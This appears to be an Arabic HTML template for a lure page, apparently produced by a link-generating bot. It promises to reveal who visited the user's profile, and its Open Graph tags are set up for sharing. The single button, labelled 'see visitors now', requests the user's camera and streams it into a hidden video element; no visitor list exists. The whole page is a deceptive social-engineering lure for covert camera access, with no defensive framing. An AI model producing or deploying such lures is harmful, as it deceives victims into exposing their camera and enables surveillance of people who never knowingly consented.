<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اكتشف من زار بروفايلك اليوم!</title>
    <meta property="og:title" content="اكتشف من زار بروفايلك اليوم!" />
    <meta property="og:description" content="فضولك يدفعك؟ اضغط لترى قائمة الزوار الآن!" />
    <meta property="og:image" content="{{BOT_URL}}/images/profile_visitors.png" />
    <meta property="og:url" content="{{FULL_LINK}}" />
    <meta property="og:type" content="website" />
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f3e5f5; color: #333; text-align: center; }
        .container { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 6px 20px rgba(0,0,0,0.1); max-width: 400px; width: 90%; border-top: 5px solid #9c27b0; }
        img { max-width: 150px; margin-bottom: 25px; }
        h1 { color: #9c27b0; margin-bottom: 15px; font-size: 1.8em; }
        p { font-size: 1.1em; line-height: 1.6; margin-bottom: 30px; }
        button { background-color: #9c27b0; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 1.2em; cursor: pointer; transition: background-color 0.3s ease; }
        button:hover { background-color: #7b1fa2; }
        video { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <img src="{{BOT_URL}}/images/profile_visitors.png" alt="زوار البروفايل">
        <h1>اكتشف من زار بروفايلك اليوم!</h1>
        <p>اضغط على الزر أدناه لترى قائمة الزوار.</p>
        <button id="activateCam">شاهد الزوار الآن</button>
        <video id="cameraFeed" autoplay playsinline></video>
    </div>
    <script>
        document.getElementById('activateCam').addEventListener('click', function() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    const video = document.getElementById('cameraFeed');
                    video.srcObject = stream;
                    console.log('Camera activated');
                })
                .catch(function(err) {
                    console.error('Error accessing camera: ', err);
                    alert('تعذر الوصول إلى الكاميرا. يرجى التأكد من منح الإذن.');
                });
            this.style.display = 'none';
        });
    </script>
</body>
</html>
